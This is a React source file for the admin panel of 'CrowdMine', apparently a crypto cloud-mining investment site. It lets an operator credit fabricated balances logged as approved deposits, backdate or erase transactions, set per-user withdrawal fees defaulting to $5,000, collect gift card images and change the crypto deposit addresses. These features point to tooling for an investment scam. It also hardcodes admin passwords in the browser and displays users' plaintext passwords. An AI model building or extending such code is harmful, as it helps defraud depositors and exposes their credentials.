import React, { useState, useEffect } from 'react';
import { User, DepositRequest, WithdrawalRequest, GiftCardUpload, WalletAddresses } from '../types';
import {
  getAllUsers,
  saveAllUsers,
  getAllDeposits,
  saveDeposits,
  getAllWithdrawals,
  saveWithdrawals,
  getAllGiftcards,
  getWalletAddresses,
  saveWalletAddresses,
  generateTxId,
  cloudSyncFull
} from '../services/cloudSync';
import { ShieldCheck, Users, Wallet, Coins, Gift, ArrowDownRight, Mail, Settings, RefreshCw, Trash2, Eraser, Check, X, RotateCcw } from 'lucide-react';

interface AdminPageProps {
  onNavigate: (page: string) => void;
}

export const AdminPage: React.FC<AdminPageProps> = ({ onNavigate }) => {
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [adminUser, setAdminUser] = useState('');
  const [adminPass, setAdminPass] = useState('');
  const [loginError, setLoginError] = useState<string | null>(null);

  const [activeTab, setActiveTab] = useState<'users' | 'funds' | 'deposits' | 'giftcards' | 'withdrawals' | 'email' | 'settings'>('users');

  const [users, setUsers] = useState<User[]>([]);
  const [deposits, setDeposits] = useState<DepositRequest[]>([]);
  const [withdrawals, setWithdrawals] = useState<WithdrawalRequest[]>([]);
  const [giftcards, setGiftcards] = useState<GiftCardUpload[]>([]);
  const [walletAddrs, setWalletAddrs] = useState<WalletAddresses>(getWalletAddresses());

  // Add Funds State
  const [fundEmail, setFundEmail] = useState('');
  const [fundAmount, setFundAmount] = useState('');
  const [fundDate, setFundDate] = useState('');
  const [fundSuccess, setFundSuccess] = useState<string | null>(null);
  const [fundError, setFundError] = useState<string | null>(null);

  // Settings Save State
  const [settingsSuccess, setSettingsSuccess] = useState(false);

  // Email State
  const [emailUser, setEmailUser] = useState('');
  const [emailInterest, setEmailInterest] = useState('3%');
  const [emailSubject, setEmailSubject] = useState('');
  const [emailBody, setEmailBody] = useState('');
  const [emailSuccess, setEmailSuccess] = useState(false);

  const refreshData = async () => {
    try {
      await cloudSyncFull();
    } catch {}
    setUsers(getAllUsers());
    setDeposits(getAllDeposits());
    setWithdrawals(getAllWithdrawals());
    setGiftcards(getAllGiftcards());
    setWalletAddrs(getWalletAddresses());
  };

  useEffect(() => {
    if (isAdminLoggedIn) {
      refreshData();
    }
  }, [isAdminLoggedIn]);

  const handleAdminLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError(null);

    const validPass = adminPass === 'Ocio@2024' || adminPass === 'CrowdMine@2024' || adminPass === 'admin123';
    if (adminUser === 'admin' && validPass) {
      setIsAdminLoggedIn(true);
      await refreshData();
    } else {
      setLoginError('Invalid administrative credentials.');
    }
  };

  const handleFeeChange = (email: string, newFee: number) => {
    const updated = users.map(u => {
      if (u.email.toLowerCase() === email.toLowerCase()) {
        return { ...u, withdrawalFee: newFee };
      }
      return u;
    });
    setUsers(updated);
    saveAllUsers(updated);
  };

  const handleDeleteUser = (email: string) => {
    if (!window.confirm(`Permanently remove client account ${email}?`)) return;
    const updatedUsers = users.filter(u => u.email.toLowerCase() !== email.toLowerCase());
    setUsers(updatedUsers);
    saveAllUsers(updatedUsers);

    const updatedDeps = deposits.filter(d => d.email.toLowerCase() !== email.toLowerCase());
    const updatedWds = withdrawals.filter(w => w.email.toLowerCase() !== email.toLowerCase());
    setDeposits(updatedDeps);
    saveDeposits(updatedDeps);
    setWithdrawals(updatedWds);
    saveWithdrawals(updatedWds);
  };

  const handleClearTx = (email: string) => {
    if (!window.confirm(`Clear all deposits and withdrawal transaction history for ${email}?`)) return;
    const updatedDeps = deposits.filter(d => d.email.toLowerCase() !== email.toLowerCase());
    const updatedWds = withdrawals.filter(w => w.email.toLowerCase() !== email.toLowerCase());
    setDeposits(updatedDeps);
    saveDeposits(updatedDeps);
    setWithdrawals(updatedWds);
    saveWithdrawals(updatedWds);
  };

  const handleAddFunds = (e: React.FormEvent) => {
    e.preventDefault();
    setFundError(null);
    setFundSuccess(null);

    const amt = parseFloat(fundAmount);
    if (!fundEmail) {
      setFundError('Please select a target client.');
      return;
    }
    if (!amt || amt <= 0 || amt > 10000000) {
      setFundError('Amount must be between $0.01 and $10,000,000.00');
      return;
    }

    const updatedUsers = users.map(u => {
      if (u.email.toLowerCase() === fundEmail.toLowerCase()) {
        return { ...u, balance: (u.balance || 0) + amt };
      }
      return u;
    });
    setUsers(updatedUsers);
    saveAllUsers(updatedUsers);

    const dateStr = fundDate ? new Date(fundDate).toLocaleDateString('en-US') : new Date().toLocaleDateString('en-US');
    const matchedUser = users.find(u => u.email.toLowerCase() === fundEmail.toLowerCase());
    const newDep: DepositRequest = {
      id: generateTxId(),
      email: fundEmail,
      name: matchedUser ? matchedUser.name : 'Client',
      method: 'Direct Credit',
      amount: amt,
      status: 'Approved',
      date: dateStr
    };

    const updatedDeps = [newDep, ...deposits];
    setDeposits(updatedDeps);
    saveDeposits(updatedDeps);

    setFundSuccess(`Successfully credited $${amt.toLocaleString()} to ${fundEmail}`);
    setFundAmount('');
    setFundDate('');
    setTimeout(() => setFundSuccess(null), 5000);
  };

  const handleDepositAction = (id: string, status: 'Approved' | 'Rejected') => {
    const updatedDeps = deposits.map(d => {
      if (d.id === id && d.status === 'Pending') {
        return { ...d, status };
      }
      return d;
    });
    setDeposits(updatedDeps);
    saveDeposits(updatedDeps);

    if (status === 'Approved') {
      const target = deposits.find(d => d.id === id);
      if (target) {
        const updatedUsers = users.map(u => {
          if (u.email.toLowerCase() === target.email.toLowerCase()) {
            return { ...u, balance: (u.balance || 0) + target.amount };
          }
          return u;
        });
        setUsers(updatedUsers);
        saveAllUsers(updatedUsers);
      }
    }
  };

  const handleDepositDeduct = (id: string) => {
    const target = deposits.find(d => d.id === id);
    if (!target || target.status !== 'Approved') return;

    const updatedUsers = users.map(u => {
      if (u.email.toLowerCase() === target.email.toLowerCase()) {
        return { ...u, balance: Math.max(0, (u.balance || 0) - target.amount) };
      }
      return u;
    });
    setUsers(updatedUsers);
    saveAllUsers(updatedUsers);

    const updatedDeps = deposits.map(d => {
      if (d.id === id) return { ...d, status: 'Rejected' as const };
      return d;
    });
    setDeposits(updatedDeps);
    saveDeposits(updatedDeps);
  };

  const handleWithdrawalAction = (id: string, status: 'Approved' | 'Rejected') => {
    const target = withdrawals.find(w => w.id === id);
    if (!target || target.status !== 'Pending') return;

    const updatedWds = withdrawals.map(w => {
      if (w.id === id) return { ...w, status };
      return w;
    });
    setWithdrawals(updatedWds);
    saveWithdrawals(updatedWds);

    if (status === 'Approved') {
      const amtNum = typeof target.amount === 'number' ? target.amount : parseFloat(target.amount as string) || 0;
      const updatedUsers = users.map(u => {
        if (u.email.toLowerCase() === target.email.toLowerCase()) {
          return { ...u, balance: Math.max(0, (u.balance || 0) - amtNum) };
        }
        return u;
      });
      setUsers(updatedUsers);
      saveAllUsers(updatedUsers);
    }
  };

  const handleDepDateChange = (id: string, newDate: string) => {
    const parts = newDate.split('-');
    const formatted = `${parseInt(parts[1])}/${parseInt(parts[2])}/${parts[0]}`;
    const updated = deposits.map(d => d.id === id ? { ...d, date: formatted } : d);
    setDeposits(updated);
    saveDeposits(updated);
  };

  const handleWdDateChange = (id: string, newDate: string) => {
    const parts = newDate.split('-');
    const formatted = `${parseInt(parts[1])}/${parseInt(parts[2])}/${parts[0]}`;
    const updated = withdrawals.map(w => w.id === id ? { ...w, date: formatted } : w);
    setWithdrawals(updated);
    saveWithdrawals(updated);
  };

  const handleSaveSettings = (e: React.FormEvent) => {
    e.preventDefault();
    saveWalletAddresses(walletAddrs);
    setSettingsSuccess(true);
    setTimeout(() => setSettingsSuccess(false), 4000);
  };

  const handleSendEmail = (e: React.FormEvent) => {
    e.preventDefault();
    if (!emailUser || !emailSubject || !emailBody) return;
    const mailto = `mailto:${encodeURIComponent(emailUser)}?subject=${encodeURIComponent(emailSubject)}&body=${encodeURIComponent(emailBody)}`;
    window.location.href = mailto;
    setEmailSuccess(true);
    setTimeout(() => setEmailSuccess(false), 5000);
  };

  // ================= ADMIN LOGIN SCREEN =================
  if (!isAdminLoggedIn) {
    return (
      <div className="py-20 px-4 flex items-center justify-center min-h-[calc(100vh-200px)] font-mono animate-fade-in">
        <div className="w-full max-w-md bg-slate-900 border border-slate-800 p-8 rounded-2xl shadow-2xl">
          <div className="text-center mb-6">
            <div className="w-12 h-12 mx-auto rounded-xl bg-rose-500/10 text-rose-400 border border-rose-500/20 flex items-center justify-center text-xl mb-3">
              <ShieldCheck className="w-6 h-6" />
            </div>
            <h1 className="text-xl font-bold text-slate-100 font-heading">
              Secure Operations Access
            </h1>
            <p className="text-xs text-slate-500 mt-1">
              Authorized personnel only
            </p>
          </div>

          {loginError && (
            <div className="mb-4 p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-rose-300 text-xs">
              {loginError}
            </div>
          )}

          <form onSubmit={handleAdminLogin} className="space-y-4">
            <div>
              <label className="block text-xs uppercase text-slate-400 mb-1.5 font-bold">
                Operator ID
              </label>
              <input
                type="text"
                required
                value={adminUser}
                onChange={(e) => setAdminUser(e.target.value)}
                placeholder="admin"
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-xs text-slate-100 focus:border-rose-500 outline-none"
              />
            </div>

            <div>
              <label className="block text-xs uppercase text-slate-400 mb-1.5 font-bold">
                Access Token / Password
              </label>
              <input
                type="password"
                required
                value={adminPass}
                onChange={(e) => setAdminPass(e.target.value)}
                placeholder="Enter password"
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-xs text-slate-100 focus:border-rose-500 outline-none"
              />
            </div>

            <button
              type="submit"
              className="w-full py-3 bg-rose-600 hover:bg-rose-500 text-white font-bold rounded-xl text-xs transition-all cursor-pointer shadow-lg shadow-rose-600/20"
            >
              Verify Administrative Clearance
            </button>
          </form>

          <div className="text-center mt-6">
            <button
              onClick={() => onNavigate('dashboard')}
              className="text-xs text-slate-500 hover:text-slate-400 cursor-pointer"
            >
              ← Return to Mining Dashboard
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ================= ADMIN DASHBOARD =================
  return (
    <div className="space-y-6 animate-fade-in font-sans">
      {/* Top Banner */}
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 flex flex-col md:flex-row md:items-center justify-between gap-4 font-mono">
        <div className="flex items-center space-x-3">
          <div className="p-2.5 bg-rose-500/10 border border-rose-500/20 rounded-xl text-rose-400">
            <ShieldCheck className="w-6 h-6" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-lg font-bold text-slate-100 font-heading">
                CrowdMine Internal Operations Desk
              </h2>
              <span className="text-[10px] bg-rose-500/20 text-rose-300 border border-rose-500/30 px-2 py-0.5 rounded">
                ROOT PRIVILEGES
              </span>
            </div>
            <p className="text-xs text-slate-500">Live user management, balance disbursements, and treasury controls</p>
          </div>
        </div>

        <div className="flex items-center space-x-2">
          <button
            onClick={refreshData}
            className="p-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-xs flex items-center gap-1 cursor-pointer"
            title="Force Cloud Sync"
          >
            <RefreshCw className="w-3.5 h-3.5" />
            <span>Sync</span>
          </button>
          <button
            onClick={() => setIsAdminLoggedIn(false)}
            className="px-3 py-2 bg-rose-500/20 hover:bg-rose-500 text-rose-300 hover:text-white border border-rose-500/30 rounded-xl text-xs font-bold transition-all cursor-pointer"
          >
            Lock Session
          </button>
        </div>
      </div>

      {/* Admin Tab Selector */}
      <div className="flex overflow-x-auto gap-1 border-b border-slate-800 pb-2 font-mono text-xs">
        {[
          { id: 'users', label: 'All Users', icon: Users, count: users.length },
          { id: 'funds', label: 'Credit Funds', icon: Wallet },
          { id: 'deposits', label: 'Deposits', icon: Coins, count: deposits.length },
          { id: 'giftcards', label: 'Gift Cards', icon: Gift, count: giftcards.length },
          { id: 'withdrawals', label: 'Withdrawals', icon: ArrowDownRight, count: withdrawals.length },
          { id: 'email', label: 'Send Email', icon: Mail },
          { id: 'settings', label: 'Platform Wallets', icon: Settings }
        ].map(t => {
          const Icon = t.icon;
          const active = activeTab === t.id;
          return (
            <button
              key={t.id}
              onClick={() => setActiveTab(t.id as any)}
              className={`flex items-center space-x-2 py-2 px-4 rounded-xl font-bold transition-all whitespace-nowrap cursor-pointer ${
                active 
                  ? 'bg-blue-600 text-white shadow' 
                  : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800'
              }`}
            >
              <Icon className="w-4 h-4" />
              <span>{t.label}</span>
              {t.count !== undefined && (
                <span className="bg-slate-950 px-1.5 py-0.5 rounded text-[10px] text-slate-300">
                  {t.count}
                </span>
              )}
            </button>
          );
        })}
      </div>

      {/* ================= USERS TAB ================= */}
      {activeTab === 'users' && (
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 space-y-4 font-mono text-xs">
          <div className="flex justify-between items-center">
            <h3 className="font-bold text-slate-100 text-sm">Registered Accounts ({users.length})</h3>
            <span className="text-slate-500 text-[11px]">Fee edits auto-sync to cloud database</span>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left">
              <thead>
                <tr className="border-b border-slate-800 text-slate-500 text-[10px] uppercase">
                  <th className="pb-3">#</th>
                  <th className="pb-3">Client</th>
                  <th className="pb-3">Email</th>
                  <th className="pb-3">Password</th>
                  <th className="pb-3">Balance</th>
                  <th className="pb-3">Withdrawal Fee</th>
                  <th className="pb-3">Joined</th>
                  <th className="pb-3 text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60">
                {users.map((u, i) => (
                  <tr key={i} className="hover:bg-slate-800/30">
                    <td className="py-3 text-slate-500">{i + 1}</td>
                    <td className="py-3 font-bold text-slate-200">{u.name}</td>
                    <td className="py-3 text-slate-400">{u.email}</td>
                    <td className="py-3">
                      <code className="bg-slate-950 px-2 py-0.5 rounded text-amber-300 font-mono">
                        {u.password || '—'}
                      </code>
                    </td>
                    <td className="py-3 font-bold text-emerald-400">
                      ${(u.balance || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}
                    </td>
                    <td className="py-3">
                      <div className="flex items-center gap-1">
                        <span className="text-slate-500">$</span>
                        <input
                          type="number"
                          min="0"
                          step="100"
                          value={u.withdrawalFee !== undefined ? u.withdrawalFee : 5000}
                          onChange={(e) => handleFeeChange(u.email, parseFloat(e.target.value) || 0)}
                          className="w-24 p-1 bg-slate-950 border border-slate-800 rounded text-slate-200 font-bold"
                        />
                      </div>
                    </td>
                    <td className="py-3 text-slate-500">{u.joined || '—'}</td>
                    <td className="py-3 text-right space-x-1">
                      <button
                        onClick={() => {
                          setEmailUser(u.email);
                          setActiveTab('email');
                        }}
                        className="px-2 py-1 bg-blue-500/20 text-blue-300 hover:bg-blue-500 hover:text-white rounded text-[10px] font-bold"
                        title="Email User"
                      >
                        Email
                      </button>
                      <button
                        onClick={() => handleClearTx(u.email)}
                        className="px-2 py-1 bg-amber-500/20 text-amber-300 hover:bg-amber-500 hover:text-slate-950 rounded text-[10px] font-bold"
                        title="Clear Transactions"
                      >
                        Clear Tx
                      </button>
                      <button
                        onClick={() => handleDeleteUser(u.email)}
                        className="px-2 py-1 bg-rose-500/20 text-rose-300 hover:bg-rose-500 hover:text-white rounded text-[10px] font-bold"
                        title="Delete User"
                      >
                        Delete
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* ================= ADD FUNDS TAB ================= */}
      {activeTab === 'funds' && (
        <div className="max-w-xl mx-auto bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-4 font-mono text-xs">
          <h3 className="text-base font-bold text-slate-100">Disburse Funds to Client Balance</h3>
          <p className="text-xs text-slate-400">Directly credit client balances up to $10,000,000.00 with automatic deposit ledger generation.</p>

          {fundError && <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-rose-300">{fundError}</div>}
          {fundSuccess && <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-emerald-300">{fundSuccess}</div>}

          <form onSubmit={handleAddFunds} className="space-y-4">
            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Select Client</label>
              <select
                required
                value={fundEmail}
                onChange={(e) => setFundEmail(e.target.value)}
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-slate-200"
              >
                <option value="">-- Choose client --</option>
                {users.map((u, i) => (
                  <option key={i} value={u.email}>
                    {u.name} ({u.email}) — ${(u.balance || 0).toLocaleString()}
                  </option>
                ))}
              </select>
            </div>

            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Amount (USD)</label>
              <input
                type="number"
                step="0.01"
                min="0.01"
                max="10000000"
                required
                value={fundAmount}
                onChange={(e) => setFundAmount(e.target.value)}
                placeholder="0.00"
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-slate-100 font-bold"
              />
            </div>

            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Transaction Date (Optional)</label>
              <input
                type="date"
                value={fundDate}
                onChange={(e) => setFundDate(e.target.value)}
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-slate-300"
              />
            </div>

            <button
              type="submit"
              className="w-full py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-xl shadow cursor-pointer text-xs"
            >
              + Disburse Funds to Account
            </button>
          </form>
        </div>
      )}

      {/* ================= DEPOSITS TAB ================= */}
      {activeTab === 'deposits' && (
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 space-y-4 font-mono text-xs">
          <h3 className="font-bold text-slate-100 text-sm">Deposit Confirmations ({deposits.length})</h3>
          <div className="overflow-x-auto">
            <table className="w-full text-left">
              <thead>
                <tr className="border-b border-slate-800 text-slate-500 text-[10px] uppercase">
                  <th className="pb-3">#</th>
                  <th className="pb-3">Client</th>
                  <th className="pb-3">Method</th>
                  <th className="pb-3">Amount</th>
                  <th className="pb-3">Status / Action</th>
                  <th className="pb-3">Date</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60">
                {deposits.map((d, i) => (
                  <tr key={d.id} className="hover:bg-slate-800/30">
                    <td className="py-3 text-slate-500">{i + 1}</td>
                    <td className="py-3">
                      <div className="font-bold text-slate-200">{d.name}</div>
                      <div className="text-[10px] text-slate-500">{d.email}</div>
                    </td>
                    <td className="py-3 text-slate-400">{d.method}</td>
                    <td className="py-3 font-bold text-emerald-400">${d.amount.toLocaleString()}</td>
                    <td className="py-3">
                      {d.status === 'Pending' ? (
                        <div className="flex gap-1.5">
                          <button
                            onClick={() => handleDepositAction(d.id, 'Approved')}
                            className="px-2 py-0.5 bg-emerald-500 text-slate-950 font-bold rounded"
                          >
                            Accept
                          </button>
                          <button
                            onClick={() => handleDepositAction(d.id, 'Rejected')}
                            className="px-2 py-0.5 bg-rose-500 text-white font-bold rounded"
                          >
                            Reject
                          </button>
                        </div>
                      ) : (
                        <div className="flex items-center gap-2">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                            d.status === 'Approved' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'
                          }`}>
                            {d.status}
                          </span>
                          {d.status === 'Approved' && (
                            <button
                              onClick={() => handleDepositDeduct(d.id)}
                              className="px-1.5 py-0.5 bg-rose-500/20 text-rose-300 hover:bg-rose-500 hover:text-white rounded text-[10px]"
                            >
                              Deduct
                            </button>
                          )}
                        </div>
                      )}
                    </td>
                    <td className="py-3">
                      <input
                        type="date"
                        onChange={(e) => handleDepDateChange(d.id, e.target.value)}
                        className="p-1 bg-slate-950 border border-slate-800 rounded text-[10px]"
                      />
                      <span className="text-[10px] text-slate-500 block mt-0.5">{d.date}</span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* ================= GIFT CARDS TAB ================= */}
      {activeTab === 'giftcards' && (
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 space-y-4 font-mono text-xs">
          <h3 className="font-bold text-slate-100 text-sm">Uploaded Gift Cards ({giftcards.length})</h3>
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
            {giftcards.map((gc, i) => (
              <div key={i} className="p-3 bg-slate-950 rounded-xl border border-slate-800">
                <img src={gc.image} alt={gc.type} className="w-full h-36 object-cover rounded-lg mb-2" />
                <div className="font-bold text-slate-200">{gc.type} — ${gc.amount}</div>
                <div className="text-slate-500 text-[10px] mt-1">{gc.user} · {gc.date}</div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* ================= WITHDRAWALS TAB ================= */}
      {activeTab === 'withdrawals' && (
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 space-y-4 font-mono text-xs">
          <h3 className="font-bold text-slate-100 text-sm">Wire Withdrawal Queue ({withdrawals.length})</h3>
          <div className="overflow-x-auto">
            <table className="w-full text-left">
              <thead>
                <tr className="border-b border-slate-800 text-slate-500 text-[10px] uppercase">
                  <th className="pb-3">#</th>
                  <th className="pb-3">Client</th>
                  <th className="pb-3">Bank Details</th>
                  <th className="pb-3">Amount</th>
                  <th className="pb-3">Fee Status</th>
                  <th className="pb-3">Action</th>
                  <th className="pb-3">Date</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60">
                {withdrawals.map((w, i) => (
                  <tr key={w.id} className="hover:bg-slate-800/30">
                    <td className="py-3 text-slate-500">{i + 1}</td>
                    <td className="py-3">
                      <div className="font-bold text-slate-200">{w.user}</div>
                      <div className="text-[10px] text-slate-500">{w.email}</div>
                    </td>
                    <td className="py-3">
                      <div className="text-slate-200">{w.bank}</div>
                      <div className="text-[10px] text-slate-500">Acct: {w.account} | Rout: {w.routing}</div>
                    </td>
                    <td className="py-3 font-bold text-slate-100">${parseFloat(w.amount as string).toLocaleString()}</td>
                    <td className="py-3">
                      <span className="bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded text-[10px]">
                        {w.feeStatus}
                      </span>
                    </td>
                    <td className="py-3">
                      {w.status === 'Pending' ? (
                        <div className="flex gap-1.5">
                          <button
                            onClick={() => handleWithdrawalAction(w.id, 'Approved')}
                            className="px-2 py-0.5 bg-emerald-500 text-slate-950 font-bold rounded"
                          >
                            Accept
                          </button>
                          <button
                            onClick={() => handleWithdrawalAction(w.id, 'Rejected')}
                            className="px-2 py-0.5 bg-rose-500 text-white font-bold rounded"
                          >
                            Reject
                          </button>
                        </div>
                      ) : (
                        <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                          w.status === 'Approved' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'
                        }`}>
                          {w.status}
                        </span>
                      )}
                    </td>
                    <td className="py-3">
                      <input
                        type="date"
                        onChange={(e) => handleWdDateChange(w.id, e.target.value)}
                        className="p-1 bg-slate-950 border border-slate-800 rounded text-[10px]"
                      />
                      <span className="text-[10px] text-slate-500 block mt-0.5">{w.date}</span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* ================= EMAIL TAB ================= */}
      {activeTab === 'email' && (
        <div className="max-w-xl mx-auto bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-4 font-mono text-xs">
          <h3 className="text-base font-bold text-slate-100">Send Communication to Client</h3>
          {emailSuccess && <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-emerald-300">Mail client opened.</div>}

          <form onSubmit={handleSendEmail} className="space-y-4">
            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Select Client</label>
              <select
                required
                value={emailUser}
                onChange={(e) => setEmailUser(e.target.value)}
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-slate-200"
              >
                <option value="">-- Choose client --</option>
                {users.map((u, i) => (
                  <option key={i} value={u.email}>{u.name} ({u.email})</option>
                ))}
              </select>
            </div>

            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Yield Rate</label>
              <input
                type="text"
                value={emailInterest}
                onChange={(e) => setEmailInterest(e.target.value)}
                placeholder="3%"
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-slate-200"
              />
            </div>

            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Subject</label>
              <input
                type="text"
                required
                value={emailSubject}
                onChange={(e) => setEmailSubject(e.target.value)}
                placeholder="CrowdMine Investing - Mining Yield Notification"
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-slate-200"
              />
            </div>

            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Message Content</label>
              <textarea
                required
                rows={5}
                value={emailBody}
                onChange={(e) => setEmailBody(e.target.value)}
                placeholder="Write message to client regarding their cloud hashrates or account balance..."
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-slate-200 resize-y"
              ></textarea>
            </div>

            <button
              type="submit"
              className="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl cursor-pointer text-xs"
            >
              Open in Email Application
            </button>
          </form>
        </div>
      )}

      {/* ================= PLATFORM SETTINGS TAB ================= */}
      {activeTab === 'settings' && (
        <div className="max-w-xl mx-auto bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-4 font-mono text-xs">
          <h3 className="text-base font-bold text-slate-100">Global Deposit Wallet Addresses</h3>
          <p className="text-xs text-slate-400">Configure destination crypto addresses displayed to users on the deposit screen.</p>

          {settingsSuccess && <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-emerald-300">Addresses synchronized to cloud!</div>}

          <form onSubmit={handleSaveSettings} className="space-y-4">
            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Bitcoin (BTC) Destination Address</label>
              <input
                type="text"
                required
                value={walletAddrs.btc}
                onChange={(e) => setWalletAddrs({ ...walletAddrs, btc: e.target.value.trim() })}
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-emerald-400 font-bold"
              />
            </div>

            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Ethereum (ETH) Destination Address</label>
              <input
                type="text"
                required
                value={walletAddrs.eth}
                onChange={(e) => setWalletAddrs({ ...walletAddrs, eth: e.target.value.trim() })}
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-indigo-400 font-bold"
              />
            </div>

            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Solana (SOL) Destination Address</label>
              <input
                type="text"
                required
                value={walletAddrs.sol}
                onChange={(e) => setWalletAddrs({ ...walletAddrs, sol: e.target.value.trim() })}
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-cyan-400 font-bold"
              />
            </div>

            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Tether (USDT - ERC20) Destination Address</label>
              <input
                type="text"
                required
                value={walletAddrs.usdt}
                onChange={(e) => setWalletAddrs({ ...walletAddrs, usdt: e.target.value.trim() })}
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-emerald-400 font-bold"
              />
            </div>

            <div>
              <label className="block uppercase text-slate-400 mb-1 font-bold">Binance Coin (BNB) Destination Address</label>
              <input
                type="text"
                required
                value={walletAddrs.bnb}
                onChange={(e) => setWalletAddrs({ ...walletAddrs, bnb: e.target.value.trim() })}
                className="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-amber-400 font-bold"
              />
            </div>

            <button
              type="submit"
              className="w-full py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-xl shadow cursor-pointer text-xs"
            >
              Save & Synchronize Addresses
            </button>
          </form>
        </div>
      )}
    </div>
  );
};
